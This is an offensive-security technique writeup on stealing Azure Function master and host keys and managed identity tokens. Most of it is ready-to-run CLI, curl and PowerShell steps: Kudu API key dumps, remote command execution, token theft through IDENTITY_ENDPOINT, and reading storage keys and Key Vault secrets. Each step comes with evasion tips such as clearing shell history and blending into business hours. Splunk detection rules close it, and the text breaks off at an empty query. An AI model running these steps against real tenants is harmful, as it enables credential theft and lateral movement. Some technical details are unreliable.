# CA-TOKEN-003: Azure Function Key Extraction

## 1. METADATA

| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-003 |
| **MITRE ATT&CK v18.1** | [Steal Application Access Token](https://attack.mitre.org/techniques/T1528/) (T1528) |
| **Tactic** | Credential Access (TA0006) |
| **Platforms** | Azure Cloud (Entra ID/Microsoft 365) |
| **Severity** | **CRITICAL** |
| **CVE** | N/A (By-Design Vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-08 |
| **Affected Versions** | All Azure Functions runtimes (.NET, Python, Node.js, PowerShell, Java) |
| **Patched In** | N/A - Architectural limitation without API changes |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Function key extraction is an advanced credential theft technique that exploits the architecture of Azure Functions to steal both function-level access keys and managed identity tokens. Azure Functions are serverless compute services that process events and execute code; they require function keys for HTTP-triggered function invocation and use managed identities for accessing other Azure resources. An attacker with access to the function's storage account, or with the ability to inject code into the function, can extract the function's Master Key and Host Keys (which grant administrative access to all functions), as well as steal scoped access tokens for the function's managed identity. These tokens grant full programmatic access to any Azure resource the function is authorized to access, including databases, key vaults, storage accounts, and compute resources.

**Attack Surface:** The vulnerability exists through multiple attack vectors: (1) Storage account access - function code is stored in Azure File Shares within the associated storage account; (2) Kudu API endpoints (SCM service) that provide command execution capabilities; (3) Environment variables (IDENTITY_ENDPOINT, IDENTITY_HEADER) that enable direct managed identity token acquisition; (4) Application settings and local.settings.json files containing secrets and connection strings; (5) Function host runtime process memory containing decryption keys; (6) Weak authentication mechanisms for SCM (Basic Auth support); (7) Code injection opportunities through storage account manipulation.

**Business Impact:** Extraction of Azure Function keys enables attackers to: (1) Invoke the function with administrative privileges regardless of intended authorization; (2) Steal managed identity access tokens with the function's permissions; (3) Pivot to other Azure resources (databases, key vaults, virtual machines) using the stolen tokens; (4) Dump sensitive connection strings and API keys from function app settings; (5) Overwrite function code with malicious payload for persistent access; (6) Execute arbitrary commands on the function container via Kudu API; (7) Enumerate all function names and configurations within the function app; (8) Access storage accounts where function code is stored, enabling lateral movement to other functions.

**Technical Context:** The attack executes in 10-30 minutes once initial access is obtained (through compromised storage account credentials, subscriptions, or code injection). The extraction is highly reliable due to documented function architecture and limited security controls on storage accounts. Detection is challenging because token requests through the IDENTITY_ENDPOINT appear legitimate and are difficult to distinguish from normal function operation. Stealth is maintained by using environment variables and legitimate Azure APIs, which generate minimal audit trail compared to interactive access attempts.

### Operational Risk

- **Execution Risk:** **HIGH** - Requires storage account access or function app access, but the extraction methods are straightforward and well-documented. Multiple independent attack paths exist.
- **Stealth:** **MEDIUM-HIGH** - Environment variable access and token requests appear legitimate. However, code injection is visible in activity logs and bulk key extraction generates detectable patterns.
- **Reversibility:** **NO** - Extracted tokens are valid until expiration (typically 1 hour for managed identity tokens). Master keys rotate only on explicit rotation, so stolen keys remain valid indefinitely until revoked.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.1 (Azure Functions) | Ensure function apps have restricted access and authentication requirements |
| **DISA STIG** | AC-2 (Account Management) | Access control for function app management and execution |
| **CISA SCuBA** | App.2.2 | Secure authentication for serverless compute resources |
| **NIST 800-53** | AC-3 | Access control enforcement for function key and managed identity access |
| **NIST 800-53** | IA-2 | Authentication for Azure Function invocation and management |
| **GDPR** | Art. 32 | Security of processing - encryption and access controls for serverless workloads |
| **DORA** | Art. 9 | Protection and prevention - secure function deployment and configuration |
| **NIS2** | Art. 21 | Cyber risk management - secure serverless compute infrastructure |
| **ISO 27001** | A.6.1.2 | Segregation of duties for function app administration |
| **ISO 27005** | Risk Scenario | Compromise of function app credentials enabling lateral movement in cloud environment |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Access to Azure Storage account where function code is stored, OR subscription-level access to function app management, OR ability to execute code on a machine/function with Azure CLI access.
- **Required Access:** Access to Azure portal, Azure CLI, PowerShell modules, or storage account file shares. For code injection, ability to write to storage file shares.

**Supported Versions:**
- **Azure Functions:** All runtimes (Consumption, Premium, Dedicated)
- **Runtimes:** .NET (in-process and isolated), Python 3.7+, Node.js 12+, PowerShell Core, Java 11+
- **Operating Systems:** Windows and Linux containers
- **Azure CLI:** Version 2.0+
- **Azure PowerShell Module:** Version 7.0+

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) (Latest version)
- [Azure PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/) (Latest version)
- [MicroBurst](https://github.com/netspi/MicroBurst) (Latest) - Azure exploitation toolkit including token decryption
- [NetSPI's Azure Function Key Extraction Tool](https://github.com/netspi/azure-functions-exploitation) (Latest)
- [Azure Storage Explorer](https://azure.microsoft.com/en-us/products/storage/storage-explorer/) or `az storage file` CLI commands
- Standard tools: `curl`, `jq`, `base64`, `python3`

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / Azure CLI Reconnaissance

#### Enumerate Azure Functions and Storage Accounts

```powershell
# Login to Azure
az login

# List all function apps in current subscription
az functionapp list --query "[].{name:name, resourceGroup:resourceGroup, runtime:runtime}" -o table

# Get detailed function app information
az functionapp show --name <FunctionAppName> --resource-group <ResourceGroupName>

# List all storage accounts in subscription
az storage account list --query "[].{name:name, resourceGroup:resourceGroup}" -o table

# Find storage accounts associated with function apps
az storage account list --query "[].{name:name, resourceGroup:resourceGroup, kind:kind}" -o table | grep -i function
```

**What to Look For:**
- **Function runtime versions:** Older versions may have more vulnerabilities
- **Storage account names:** Usually follow pattern `<functionappname>storage`
- **Scale mode:** Consumption tier has more restrictive permissions; Premium has more access
- **Managed identity:** Check if function has system or user-assigned identity

#### Enumerate Function App Keys and Connections

```powershell
# List function app host keys (requires Function App Contributor role)
az functionapp keys list --name <FunctionAppName> --resource-group <ResourceGroupName>

# Get function-specific keys
az functionapp function keys list --name <FunctionAppName> --resource-group <ResourceGroupName> --function-name <FunctionName>

# Retrieve app settings (may contain secrets)
az functionapp config appsettings list --name <FunctionAppName> --resource-group <ResourceGroupName>

# Check for managed identity assignment
az functionapp identity show --name <FunctionAppName> --resource-group <ResourceGroupName>

# Get master key using ARM API
az rest --method post --url /subscriptions/{subscriptionId}/resourceGroups/{resourceGroup}/providers/Microsoft.Web/sites/{functionAppName}/host/default/listKeys?api-version=2021-02-01
```

**What to Look For:**
- **Master key presence:** Indicates administrative access capability
- **App settings:** Connection strings, API keys, database credentials
- **Managed identity type:** System-assigned vs user-assigned affects exploitation path
- **Key rotation dates:** Old keys may be forgotten in configuration

#### Check Storage Account Access and File Shares

```powershell
# List storage accounts accessible from function app
az storage account list --query "[].name" -o tsv | while read account; do
    echo "Account: $account"
    az storage share list --account-name $account -o table 2>/dev/null || echo "No access to $account"
done

# List file shares in storage account (if accessible)
az storage share list --account-name <StorageAccountName> --query "[].name" -o tsv

# List files in function code share
az storage file list --share-name <ShareName> --account-name <StorageAccountName> --path "site/wwwroot" -o table
```

**What to Look For:**
- **File share access:** If accessible, function code can be read/modified
- **Function.json files:** Reveal function triggers and authorization levels
- **host.json configuration:** Contains encryption settings and runtime configuration
- **Local.settings.json in deployments:** Contains secrets and connection strings

#### Check for Managed Identity Access

```powershell
# If you have command execution on a function, check environment variables
# This returns the managed identity endpoint and token

$env:IDENTITY_ENDPOINT
$env:IDENTITY_HEADER

# Get token using the environment variables
curl "$env:IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H "X-IDENTITY-HEADER: $env:IDENTITY_HEADER"
```

**What to Look For:**
- **IDENTITY_ENDPOINT:** Indicates managed identity is available
- **Token acquisition success:** Confirms function has assigned identity
- **Token scope:** Determines which resources can be accessed

#### Linux/Bash CLI Reconnaissance

```bash
# Login to Azure via CLI
az login

# Query function apps and storage accounts
az functionapp list --query "[*].[name,resourceGroup]" -o tsv | while read func group; do
    echo "Function: $func in Resource Group: $group"
    az functionapp show --name "$func" --resource-group "$group" --query "identity.principalId"
done

# Enumerate storage file shares
for account in $(az storage account list --query "[*].name" -o tsv); do
    az storage share list --account-name "$account" 2>/dev/null
done

# Check for public storage account access
az storage container list --account-name <StorageAccountName> --account-key <AccountKey> --auth-mode key
```

**What to Look For:**
- **Principal ID:** Managed identity identifier (if assigned)
- **File share enumeration:** Access to function source code
- **Public containers:** Indicates misconfiguration

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extract Master Key via Kudu API (SCM Service)

**Supported Versions:** All Azure Functions runtimes

Kudu is the deployment and management service for Azure App Services and Functions. It exposes an API that can retrieve function keys without authentication if SCM credentials are available.

#### Step 1: Obtain Kudu/SCM Credentials

**Objective:** Acquire the Kudu API endpoint and credentials (publishing profile or management token).

**Command (Using Azure CLI):**
```bash
# Get publishing profile credentials
az functionapp deployment list-publishing-profiles \
  --name <FunctionAppName> \
  --resource-group <ResourceGroupName> \
  --xml --query "[?publishMethod=='MSDeploy'].{url:publishUrl, username:userName, password:userPWD}" -o json

# Extract username and password from publishing profile
# Format: username = $<FunctionAppName>
# Password = <base64-encoded-string>
```

**Command (Using Azure PowerShell):**
```powershell
# Get Kudu API token for authenticated requests
$Token = (Get-AzAccessToken).Token
$FunctionAppName = "<FunctionAppName>"
$ResourceGroup = "<ResourceGroupName>"

# Construct Kudu endpoint
$KuduUrl = "https://$($FunctionAppName).scm.azurewebsites.net"

# Test Kudu connectivity
$Headers = @{Authorization = "Bearer $Token"}
Invoke-RestMethod -Uri "$KuduUrl/api/environment" -Headers $Headers
```

**Expected Output:**
```json
{
  "hostName": "functionapp.azurewebsites.net",
  "homeDirectory": "D:\\home",
  "version": "1.0"
}
```

**OpSec & Evasion:**
- Use managed identity access tokens to avoid logging plaintext credentials
- Perform API calls from within Azure environment to avoid external IP logging
- Detection likelihood: **MEDIUM** - Kudu API calls are logged but often not monitored

#### Step 2: Query Kudu API for Function Keys

**Objective:** Call the Kudu admin API endpoint to retrieve all function keys.

**Command (Using curl with Bearer Token):**
```bash
# Get master and function keys via Kudu API
FUNCTION_APP="<FunctionAppName>"
TOKEN="<AccessToken>"

curl -X GET "https://$FUNCTION_APP.scm.azurewebsites.net/api/functions/admin/token" \
  -H "Authorization: Bearer $TOKEN"

# Alternative: Using Basic Auth (if publishing profile credentials available)
USERNAME='$<FunctionAppName>'
PASSWORD='<PublishingProfilePassword>'
ENCODED=$(echo -n "$USERNAME:$PASSWORD" | base64)

curl -X GET "https://$FUNCTION_APP.scm.azurewebsites.net/api/functions/admin/token" \
  -H "Authorization: Basic $ENCODED"
```

**Expected Output:**
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2Z1bmN0aW9uYXBwLnNjbS5henVyZXdlYnNpdGVzLm5ldCIsImF1ZCI6Imh0dHBzOi8vZnVuY3Rpb25hcHAuc2NtLmF6dXJld2Vic2l0ZXMubmV0In0.KZ_mR...
```

**What This Means:**
- JWT token for authenticated Kudu API access
- Contains admin privileges for all function operations
- Can be used to list and revoke function keys

**OpSec & Evasion:**
- Store token in memory only; do not write to disk
- Perform subsequent API calls quickly
- Detection likelihood: **MEDIUM-HIGH** - Kudu token requests are suspicious

#### Step 3: List All Function Keys

**Objective:** Enumerate all function and master keys accessible through Kudu.

**Command:**
```bash
# Using the obtained JWT token
KUDU_TOKEN="<JWTToken>"
FUNCTION_APP="<FunctionAppName>"

# Get master keys
curl -X GET "https://$FUNCTION_APP.scm.azurewebsites.net/api/functions/admin/keys" \
  -H "Authorization: Bearer $KUDU_TOKEN" | jq .

# Get specific function keys
curl -X GET "https://$FUNCTION_APP.scm.azurewebsites.net/api/functions/<FunctionName>/keys" \
  -H "Authorization: Bearer $KUDU_TOKEN" | jq .
```

**Expected Output:**
```json
{
  "master": {
    "name": "default",
    "value": "q7L9N8mK2x5pY3jV6wQ1rT4uS9oI0pA5bC8dE1fG4hJ7kL0mN3oP6qR9sT2uV5w=="
  },
  "functions": [
    {
      "name": "HttpTrigger1",
      "keys": [
        {
          "name": "default",
          "value": "z1X2c3V4b5N6m7A8s9D0fG1hJ2kL3mN4oP5qR6sT7uV8wX9yZ0aB1cD2eF3gH4i=="
        }
      ]
    }
  ]
}
```

**What This Means:**
- Master key provides full administrative access to all functions
- Function keys only invoke specific functions
- Master key is most valuable for persistence

**OpSec & Evasion:**
- Enumerate only functions of interest (avoid bulk enumeration)
- Delete token history from shell
- Detection likelihood: **HIGH** - Bulk key enumeration triggers alerts

#### Step 4: Invoke Functions Using Extracted Keys

**Objective:** Use the stolen function keys to invoke the function with any payload.

**Command:**
```bash
# Invoke function using master key
FUNCTION_APP="<FunctionAppName>"
FUNCTION_NAME="<FunctionName>"
FUNCTION_KEY="<ExtractedKey>"

curl -X POST "https://$FUNCTION_APP.azurewebsites.net/api/$FUNCTION_NAME?code=$FUNCTION_KEY" \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'

# If function is HTTP-triggered and accepts GET
curl "https://$FUNCTION_APP.azurewebsites.net/api/$FUNCTION_NAME?code=$FUNCTION_KEY&cmd=id"
```

**OpSec & Evasion:**
- Payload should match function's expected input
- Use direct invocation to avoid logging through function app UI
- Detection likelihood: **MEDIUM** - Function invocation logs may be monitored

---

### METHOD 2: Steal Managed Identity Tokens via Environment Variables

**Supported Versions:** All Azure Functions with managed identity assigned

This method exploits the function's ability to acquire tokens for its assigned managed identity by accessing the IDENTITY_ENDPOINT and IDENTITY_HEADER environment variables.

#### Step 1: Gain Code Execution on Function Container

**Objective:** Execute code on the function container to access environment variables.

**Command (Via Kudu API - /api/command endpoint):**
```bash
# Execute command on function container via Kudu
KUDU_TOKEN="<JWTToken>"
FUNCTION_APP="<FunctionAppName>"

# Get environment variables
curl -X POST "https://$FUNCTION_APP.scm.azurewebsites.net/api/command" \
  -H "Authorization: Bearer $KUDU_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"command":"set"}'

# Output shows all environment variables including IDENTITY_ENDPOINT and IDENTITY_HEADER
```

**Command (Via SSH Web Shell in Azure Portal):**
```bash
# Connect via SSH if available
# Then execute:
printenv | grep IDENTITY
env | grep -i identity
```

**Command (Via FTP/SFTP File Access):**
```bash
# If FTP access is available, create a test.php or test.html file
# that outputs environment variables when accessed
echo '<?php phpinfo(); ?>' > /home/site/wwwroot/test.php

# Then access via browser
# https://<FunctionAppName>.azurewebsites.net/test.php
```

**Expected Output:**
```
IDENTITY_ENDPOINT=http://127.0.0.1:8081/msi/token
IDENTITY_HEADER=7d3c2f1a-4e5b-4c3d-8e9f-1a2b3c4d5e6f
```

**What This Means:**
- IDENTITY_ENDPOINT: Local URL to token service (unique to each function instance)
- IDENTITY_HEADER: SSRF protection token (must be included in token requests)

**OpSec & Evasion:**
- Minimize time spent in command execution
- Clean up any test files created
- Detection likelihood: **HIGH** - Command execution is prominently logged

#### Step 2: Request Scoped Managed Identity Token

**Objective:** Use the IDENTITY_ENDPOINT to acquire an access token scoped to Azure Resource Manager.

**Command (From Function Code or Via Command Execution):**
```bash
# Acquire token for Azure Resource Manager (management.azure.com)
IDENTITY_ENDPOINT="http://127.0.0.1:8081/msi/token"
IDENTITY_HEADER="7d3c2f1a-4e5b-4c3d-8e9f-1a2b3c4d5e6f"

curl -X GET "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  -H "Metadata: true" | jq '.access_token' -r > token.txt

# Acquire token for Microsoft Graph API
curl -X GET "$IDENTITY_ENDPOINT?resource=https://graph.microsoft.com/&api-version=2017-09-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  -H "Metadata: true"

# Acquire token for Storage Account access
curl -X GET "$IDENTITY_ENDPOINT?resource=https://storage.azure.com/&api-version=2017-09-01" \
  -H "X-IDENTITY-HEADER: $IDENTITY_HEADER"
```

**Expected Output:**
```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzAzYzMyNzQ1LTUwMjMtNGY5Zi04ZWU0LWM3N2M5ZjM3NzQ3MC8iLCJpYXQiOjE2MzcwMTk2MjEsIm5iZiI6MTYzNzAxOTYyMSwiZXhwIjoxNjM3MTAzMzIxLCJhaW8iOiJBVFFBeS84VEFBQUFXd0lpYjhZVEIwR3lPeEwrR3lJNm9qWTdYb2lEMnlkcmFpczBSRmlGdWVscU9mRzMybzRTUkgrNXZKQzhaeUlYTkdSMDVZN0JxYU0yOHRwejZZPSIsImFzc2VydGlvbnMiOiJDckJHYzFOMWMyTkpSVkpRUVRrNU1URTROVFQ0PSIsImdyb3VwcyI6WyIzZDJjY2FhYi01ZjE4LTQzNzgtODgxNy04OThjMzE3YjRlNjgiXSwiZGlydHlUaW1lc3RhbXAiOjE2MzcwMTk2MjEsImlzc3VlciI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzAzYzMyNzQ1LTUwMjMtNGY5Zi04ZWU0LWM3N2M5ZjM3NzQ3MC8ifQ.bR7C...",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer",
  "expires_in": "3599"
}
```

**What This Means:**
- JWT token valid for ~1 hour (expires_in: 3599 seconds)
- Scoped to Azure Resource Manager (management.azure.com)
- Can be used to call any ARM API the managed identity has permissions for

**OpSec & Evasion:**
- Token acquisition is logged but appears legitimate
- Use token quickly before expiration
- Multiple token requests may trigger anomaly detection
- Detection likelihood: **MEDIUM** - Legitimate but unusual token requests may be monitored

#### Step 3: Exploit Token to Access Cloud Resources

**Objective:** Use the stolen managed identity token to access protected Azure resources.

**Command (List Virtual Machines in Subscription):**
```bash
# Using stolen token to list VMs
TOKEN="<StolenManagedIdentityToken>"
SUBSCRIPTION_ID="<SubscriptionId>"

curl -X GET \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Compute/virtualMachines?api-version=2022-11-01" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[] | {name: .name, resourceGroup: .id}'
```

**Command (Enumerate Storage Accounts and Keys):**
```bash
# List storage accounts accessible to the managed identity
curl -X GET \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/providers/Microsoft.Storage/storageAccounts?api-version=2021-06-01" \
  -H "Authorization: Bearer $TOKEN"

# Get storage account keys (for lateral movement)
curl -X POST \
  "https://management.azure.com/subscriptions/$SUBSCRIPTION_ID/resourceGroups/<ResourceGroup>/providers/Microsoft.Storage/storageAccounts/<StorageAccountName>/listKeys?api-version=2021-06-01" \
  -H "Authorization: Bearer $TOKEN"
```

**Command (Access Key Vault Secrets):**
```bash
# Enumerate secrets in Key Vault
curl -X GET \
  "https://<KeyVaultName>.vault.azure.net/secrets?api-version=2016-10-01" \
  -H "Authorization: Bearer $TOKEN"

# Retrieve specific secret
curl -X GET \
  "https://<KeyVaultName>.vault.azure.net/secrets/<SecretName>?api-version=2016-10-01" \
  -H "Authorization: Bearer $TOKEN"
```

**OpSec & Evasion:**
- API calls are logged in Azure Activity Logs
- Use token during normal business hours to blend with legitimate activity
- Limit scope of enumeration to appear as legitimate operations
- Detection likelihood: **HIGH** - Bulk resource enumeration is unusual for service accounts

---

### METHOD 3: Extract Keys from Storage Account File Shares

**Supported Versions:** All Azure Functions runtimes

Function code and configuration are stored in Azure File Shares within the associated storage account. Keys and secrets are often visible in configuration files and function code.

#### Step 1: Access Storage Account File Shares

**Objective:** Gain access to the storage account file shares containing function code.

**Command (Using Storage Account Connection String):**
```bash
# List file shares in storage account
CONNECTION_STRING="DefaultEndpointProtocol=https;AccountName=<AccountName>;AccountKey=<AccountKey>;EndpointSuffix=core.windows.net"

az storage share list --connection-string "$CONNECTION_STRING" --query "[].name" -o tsv

# Access specific share containing function code
az storage file list --connection-string "$CONNECTION_STRING" \
  --share-name "azureweb" --path "site/wwwroot" -o table
```

**Command (Direct URL Access - If Blob is Public):**
```bash
# Check if storage account containers are publicly accessible
STORAGE_ACCOUNT="<StorageAccountName>"

# Attempt to list blobs without authentication
curl -s "https://$STORAGE_ACCOUNT.blob.core.windows.net/<ContainerName>?restype=container&comp=list" | grep BlobName

# If successful, download sensitive files
curl -o config.json "https://$STORAGE_ACCOUNT.blob.core.windows.net/<ContainerName>/site/wwwroot/function.json"
```

**Expected Output:**
```
site
azureweb
zone1
```

**OpSec & Evasion:**
- Use connection strings instead of account keys to limit logging
- Access only necessary files (avoid bulk enumeration)
- Detection likelihood: **MEDIUM** - Storage account access is logged

#### Step 2: Extract Secrets from Function Code and Configuration Files

**Objective:** Retrieve secrets, keys, and credentials from function application settings and source code.

**Command (Read host.json for Encryption Settings):**
```bash
# Download host.json configuration file
az storage file download --connection-string "$CONNECTION_STRING" \
  --share-name "azureweb" --path "site/wwwroot/host.json" \
  --dest-file ./host.json

# View encrypted keys information
cat host.json | jq '.functionKeys.encryptionKeys'
```

**Command (Extract AppSettings from Function Configuration):**
```bash
# Function app settings contain connection strings and keys
az functionapp config appsettings list \
  --name <FunctionAppName> \
  --resource-group <ResourceGroupName> \
  --query "[].{name:name, value:value}" -o json

# Example secrets that may be exposed:
# - AzureWebJobsStorage (connection string)
# - Database connection strings
# - API keys for external services
# - Service principal credentials
```

**Command (Search Function Code for Hard-Coded Secrets):**
```bash
# Download function code from storage
az storage file download --connection-string "$CONNECTION_STRING" \
  --share-name "azureweb" --path "site/wwwroot/<FunctionName>/index.js" \
  --dest-file ./function_code.js

# Search for secrets in code
grep -i "key\|secret\|password\|token\|credential" function_code.js

# Example hard-coded secrets found:
# connectionString: "Server=sql.database.azure.com;User=admin;Password=P@ssw0rd123;"
# apiKey: "sk_live_51234567890abcdefgh..."
# clientSecret: "zyx98765432abcdefgh..."
```

**Expected Output:**
```json
[
  {
    "name": "AzureWebJobsStorage",
    "value": "DefaultEndpointProtocol=https;AccountName=storageaccount;AccountKey=abcd1234...=="
  },
  {
    "name": "DatabaseConnectionString",
    "value": "Server=contoso.database.windows.net;User=dbuser;Password=DB@Pass123;"
  },
  {
    "name": "ApiKey",
    "value": "sk_live_9876543210abcdefghijklmnop"
  }
]
```

**What This Means:**
- Direct access to all application secrets and credentials
- Storage account keys enable access to other resources
- API keys and passwords for external services
- Database credentials with direct database access capability

**OpSec & Evasion:**
- Download only required files
- Clean up downloaded files after extraction
- Use native tools (az storage file download) to avoid suspicion
- Detection likelihood: **MEDIUM-HIGH** - Bulk file downloads and access may be monitored

#### Step 3: Decrypt Encryption Keys from host.json

**Objective:** Decrypt the MACHINEKEY encryption keys stored in host.json to decrypt function keys.

**Command (Using MicroBurst Tool):**
```powershell
# Using MicroBurst's Azure Functions exploitation module
Install-Module MicroBurst -Force
Import-Module MicroBurst

# Decrypt function app keys from host.json
$HostJsonPath = ".\host.json"
$DecryptedKeys = Invoke-AzFunctionsKeyExtraction -HostJsonPath $HostJsonPath

# Output contains decrypted master and function keys
$DecryptedKeys | Format-Table -AutoSize
```

**Command (Manual Decryption with DPAPI):**
```powershell
# Extract encryption key from host.json
$HostJson = Get-Content .\host.json | ConvertFrom-Json
$EncryptedKey = $HostJson.functionKeys.decryptionKeyId

# Decrypt using DPAPI (if running as same user context)
$DecryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    [Convert]::FromBase64String($EncryptedKey),
    $null,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
)
$DecryptedKey = [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)

Write-Host "Decrypted Key: $DecryptedKey"
```

**OpSec & Evasion:**
- DPAPI decryption is difficult to log or detect
- Use decryption in isolated environment
- Detection likelihood: **LOW** - Local DPAPI operations are not logged

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

### Atomic Test #1: Extract Function Keys via Kudu API

**Atomic Test ID:** T1528-003-MCADDF  
**Test Name:** Azure Function Key Extraction via Kudu API  
**Description:** Simulates extraction of Azure Function master and function keys using Kudu API.

**Supported Versions:** All Azure Functions runtimes

**Command:**
```bash
# Prerequisites: Access to Azure subscription and function app
FUNCTION_APP="<FunctionAppName>"
RESOURCE_GROUP="<ResourceGroupName>"

# Authenticate with Azure CLI
az login

# Get access token for Kudu API
TOKEN=$(az account get-access-token --query accessToken -o tsv)

# Call Kudu API to list function keys
curl -X GET "https://$FUNCTION_APP.scm.azurewebsites.net/api/functions/admin/keys" \
  -H "Authorization: Bearer $TOKEN" | jq .

# If successful, keys are returned
if [ $? -eq 0 ]; then
    echo "SUCCESS: Function keys extracted"
    exit 0
else
    echo "FAILED: Could not extract keys"
    exit 1
fi
```

**Cleanup Command:**
```bash
# No cleanup needed - read-only operation
# Clear command history
history -c
```

**Reference:** [Atomic Red Team - T1528](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1528/T1528.md)

---

## 7. TOOLS & COMMANDS REFERENCE

### [MicroBurst](https://github.com/netspi/MicroBurst)

**Version:** Latest  
**Language:** PowerShell  
**Supported Platforms:** Windows PowerShell 5.0+, PowerShell Core

**Installation:**
```powershell
Install-Module MicroBurst -Scope CurrentUser -Force
Get-Module MicroBurst -ListAvailable
```

**Key Cmdlets for Function Exploitation:**
```powershell
# Extract function keys from host.json
Invoke-AzFunctionsKeyExtraction -HostJsonPath .\host.json

# Enumerate function apps in subscription
Get-AzFunctionApp -Verbose

# Exploit storage account to extract function code
Invoke-AzStorageEnumeration -Verbose
```

### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/)

**Version:** Latest (2.0+)  
**Platform:** Cross-platform (Windows, macOS, Linux)

**Installation:**
```bash
# Windows
msiexec.exe /i Azure\ CLI.msi

# macOS
brew install azure-cli

# Linux
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

**Key Commands for Function Key Extraction:**
```bash
# List function apps
az functionapp list

# Get function app details
az functionapp show --name <FunctionAppName> --resource-group <ResourceGroup>

# List function app keys (requires appropriate permissions)
az functionapp keys list --name <FunctionAppName> --resource-group <ResourceGroup>

# Get app settings (may contain secrets)
az functionapp config appsettings list --name <FunctionAppName> --resource-group <ResourceGroup>
```

### [Azure PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/)

**Version:** Latest (7.0+)  
**Platform:** Windows PowerShell 5.0+, PowerShell Core

**Installation:**
```powershell
Install-Module Az -AllowClobber -Scope CurrentUser -Force
```

**Key Cmdlets:**
```powershell
# Connect to Azure
Connect-AzAccount

# Get function app details
Get-AzFunctionApp -Name <FunctionAppName> -ResourceGroupName <ResourceGroup>

# Get function app publish profile
Get-AzWebAppPublishingProfile -Name <FunctionAppName> -ResourceGroupName <ResourceGroup>

# Get app settings
Get-AzFunctionAppSetting -Name <FunctionAppName> -ResourceGroupName <ResourceGroup>
```

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Kudu API Token Request

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:aad:audit` or `azure:activity`
- **Required Fields:** `operationName`, `caller`, `properties.ipAddress`, `resourceType`
- **Alert Threshold:** 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
sourcetype="azure:activity" OR sourcetype="azure:aad:audit"
(operationName="*Kudu*" OR operationName="*SCM*" OR operationName="*api/functions*")
| stats count by caller, operationName, properties.ipAddress, resourceType
| where count >= 1
```

**What This Detects:**
- Direct API calls to Kudu service
- Token requests for SCM/administrative access
- Unusual caller patterns (non-standard automation accounts)

### Rule 2: Managed Identity Token Acquisition via IDENTITY_ENDPOINT

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:function:logs`
- **Required Fields:** `message`, `functionName`, `operationName`
- **Alert Threshold:** > 5 requests in 10 minutes
- **Applies To Versions:** All

**SPL Query:**
```spl
sourcetype="azure:function:logs" (message="*IDENTITY_ENDPOINT*" OR message="*msi/token*" OR message="*X-IDENTITY-HEADER*")
| stats count by functionName, message, request_source_ip
| where count > 5
```

**What This Detects:**
- Abnormal managed identity token requests
- Multiple token acquisitions in short timeframe
- Token requests from unusual sources

### Rule 3: Function Key Enumeration via API

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:aad:audit`
- **Required Fields:** `operationName`, `resourceType`, `caller`
- **Alert Threshold:** 1 event for listKeys operation
- **Applies To Versions:** All

**SPL Query:**
```spl
sourcetype="azure:aad:audit" operationName="*listKeys*" resourceType="*Function*"
| stats count by caller, operationName, resourceId, properties.ipAddress
| where count >= 1
```

**What This Detects:**
- Requests to enumerate function keys
- Unauthorized attempts to extract keys
- Non-standard callers accessing key operations

### Rule 4: Storage Account File Share Access for Function Code

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:storage:audit`
- **Required Fields:** `objectName`, `operationName`, `caller`, `sourceIPAddress`
- **Alert Threshold:** > 10 file reads in 5 minutes
- **Applies To Versions:** All

**SPL Query:**
```spl
sourcetype="azure:storage:audit" (objectName="*site/wwwroot*" OR objectName="*host.json*" OR objectName="*function.json*")
(operationName="*GetBlob*" OR operationName="*GetFile*" OR operationName="*ListBlob*")
| stats count by caller, objectName, operationName
| where count > 10
```

**What This Detects:**
- Bulk access to function source code
- Extraction of configuration files (host.json, function.json)
- Unauthorized file share access

### Rule 5: Suspicious Command Execution via Kudu /api/command

**Rule Configuration:**
- **Required Index:** `azure_activity`
- **Required Sourcetype:** `azure:appservice:logs` or `azure:diagnostics`
- **Required Fields:** `request_uri`, `caller`, `remote_ip`, `response_status`
- **Alert Threshold:** 1 event
- **Applies To Versions:** All

**SPL Query:**
```spl
